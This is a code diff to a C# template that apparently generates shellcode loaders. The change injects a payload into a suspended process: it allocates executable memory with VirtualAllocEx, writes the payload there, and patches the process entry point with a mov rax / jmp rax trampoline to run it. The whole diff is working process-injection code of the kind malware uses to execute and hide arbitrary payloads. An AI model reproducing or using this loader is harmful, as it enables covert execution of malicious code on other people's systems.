@@ -163,9 +163,28 @@ namespace {{NAMESPACE}}
             IntPtr pNtHeader = (IntPtr)(pHeader.AddrOfPinnedObject().ToInt64() + dosHeader.e_lfanew);
             IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeader, typeof(IMAGE_NT_HEADERS64));
 
-            IntPtr codeEntry = ((IntPtr)(ntHeader.OptionalHeader.AddressOfEntryPoint + pImageBase.ToInt64()));
+            uint Commit = 0x1000;
+            uint Reserve = 0x2000;
             IntPtr numBytesWritten;
-            if (!WriteProcessMemory(pi.hProcess, codeEntry, payload, payload.Length, out numBytesWritten))
+
+            IntPtr hPayloadAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length, Commit | Reserve, 0x20 /*RX*/);
+            if (!WriteProcessMemory(pi.hProcess, hPayloadAddr, payload, payload.Length, out numBytesWritten))
+            {
+                Console.WriteLine(Marshal.GetLastWin32Error().ToString());
+                Process.GetProcessById(pi.dwProcessId).Kill(); //Kill the suspended process.
+                Environment.Exit(1);
+            }
+            
+            byte[] mov_rax = new byte[2] {0x48, 0xb8};
+            byte[] jmp_address = BitConverter.GetBytes(hPayloadAddr.ToInt64());
+            byte[] jmp_rax = new byte[2] {0xff, 0xe0};
+            byte[] full = new byte[mov_rax.Length + jmp_address.Length + jmp_rax.Length];
+            mov_rax.CopyTo(full, 0);
+            jmp_address.CopyTo(full, mov_rax.Length);
+            jmp_rax.CopyTo(full, mov_rax.Length + jmp_address.Length);
+
+            IntPtr codeEntry = ((IntPtr)(ntHeader.OptionalHeader.AddressOfEntryPoint + pImageBase.ToInt64()));
+            if (!WriteProcessMemory(pi.hProcess, codeEntry, full, full.Length, out numBytesWritten))
             {
                 Console.WriteLine(Marshal.GetLastWin32Error().ToString());
                 Process.GetProcessById(pi.dwProcessId).Kill(); //Kill the suspended process.
@@ -498,6 +517,9 @@ namespace {{NAMESPACE}}
 
         [DllImport(""kernel32.dll"", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
     }
 }";
     }
